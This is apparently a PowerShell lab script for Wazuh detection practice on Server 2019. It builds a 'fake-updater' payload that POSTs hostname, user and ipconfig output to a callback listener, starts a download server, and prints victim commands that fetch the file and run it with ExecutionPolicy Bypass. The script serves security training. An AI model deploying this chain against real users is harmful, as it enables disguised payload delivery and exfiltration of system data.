# ============================================================
# SECTION 1 - START ATTACKER SIMULATOR
# Safe Wazuh Lab Simulation
# Server 2019
# ============================================================

$LabFolder = "C:\LabShare"
$PayloadPath = "$LabFolder\fake-updater.ps1"

# ============================================================
# SECTION 2 - CREATE LAB FOLDER
# ============================================================

if (-not (Test-Path $LabFolder)) {
    New-Item -Path $LabFolder -ItemType Directory -Force | Out-Null
    Write-Host "Created folder: $LabFolder" -ForegroundColor Green
}
else {
    Write-Host "Lab folder already exists: $LabFolder" -ForegroundColor Yellow
}

# ============================================================
# SECTION 3 - CREATE FAKE UPDATER PAYLOAD
# ============================================================

@'
$ServerIP = Read-Host "Enter Server 2019 IP Address"

$Data = @"
=== Fake Updater Callback ===
Hostname: $env:COMPUTERNAME
User: $env:USERNAME
Date: $(Get-Date)

IPCONFIG:
$(ipconfig)
"@

Invoke-RestMethod `
    -Uri "http://$ServerIP`:8080/" `
    -Method POST `
    -ContentType "text/plain" `
    -Body $Data
'@ | Out-File $PayloadPath -Encoding UTF8

Write-Host "Payload created: $PayloadPath" -ForegroundColor Green

# ============================================================
# SECTION 4 - START CALLBACK LISTENER ON PORT 8080
# ============================================================

Start-Process powershell.exe -ArgumentList @(
    "-NoExit",
    "-ExecutionPolicy", "Bypass",
    "-Command",
    @"
`$Listener = New-Object System.Net.HttpListener
`$Listener.Prefixes.Add('http://+:8080/')
`$Listener.Start()

Write-Host 'Listening for callbacks on port 8080...' -ForegroundColor Green

while (`$true) {
    `$Context = `$Listener.GetContext()
    `$Request = `$Context.Request

    Write-Host ''
    Write-Host '===== CALLBACK RECEIVED =====' -ForegroundColor Cyan
    Write-Host "Method: `$(`$Request.HttpMethod)"
    Write-Host "Remote IP: `$(`$Request.RemoteEndPoint)"

    `$Reader = New-Object System.IO.StreamReader(`$Request.InputStream, `$Request.ContentEncoding)
    `$Data = `$Reader.ReadToEnd()

    if ([string]::IsNullOrWhiteSpace(`$Data)) {
        Write-Host 'No body data received.' -ForegroundColor Yellow
    }
    else {
        Write-Host ''
        Write-Host `$Data -ForegroundColor White
    }

    `$ResponseText = 'OK'
    `$Buffer = [System.Text.Encoding]::UTF8.GetBytes(`$ResponseText)

    `$Response = `$Context.Response
    `$Response.StatusCode = 200
    `$Response.ContentLength64 = `$Buffer.Length
    `$Response.OutputStream.Write(`$Buffer, 0, `$Buffer.Length)
    `$Response.OutputStream.Close()
}
"@
)

# ============================================================
# SECTION 5 - START PAYLOAD DOWNLOAD SERVER ON PORT 9090
# ============================================================

Start-Process powershell.exe -ArgumentList @(
    "-NoExit",
    "-ExecutionPolicy", "Bypass",
    "-Command",
    @"
`$PayloadPath = '$PayloadPath'

`$Listener = New-Object System.Net.HttpListener
`$Listener.Prefixes.Add('http://+:9090/')
`$Listener.Start()

Write-Host 'Payload server running on port 9090...' -ForegroundColor Green

while (`$Listener.IsListening) {
    `$Context = `$Listener.GetContext()
    `$Response = `$Context.Response

    `$Buffer = [System.IO.File]::ReadAllBytes(`$PayloadPath)

    `$Response.ContentType = 'text/plain'
    `$Response.ContentLength64 = `$Buffer.Length
    `$Response.OutputStream.Write(`$Buffer, 0, `$Buffer.Length)
    `$Response.OutputStream.Close()

    Write-Host 'Payload downloaded by client.' -ForegroundColor Yellow
}
"@
)

# ============================================================
# SECTION 6 - DISPLAY NEXT STEPS
# ============================================================

Write-Host ""
Write-Host "Attacker simulator is ready." -ForegroundColor Cyan
Write-Host ""
Write-Host "Payload download URL:" -ForegroundColor Yellow
Write-Host "http://YOUR-SERVER-2019-IP:9090/"
Write-Host ""
Write-Host "Victim download command:"
Write-Host 'Invoke-WebRequest -Uri "http://YOUR-SERVER-2019-IP:9090/" -OutFile "C:\Users\Public\fake-updater.ps1"'
Write-Host ""
Write-Host "Victim run command:"
Write-Host 'powershell.exe -ExecutionPolicy Bypass -File "C:\Users\Public\fake-updater.ps1"'
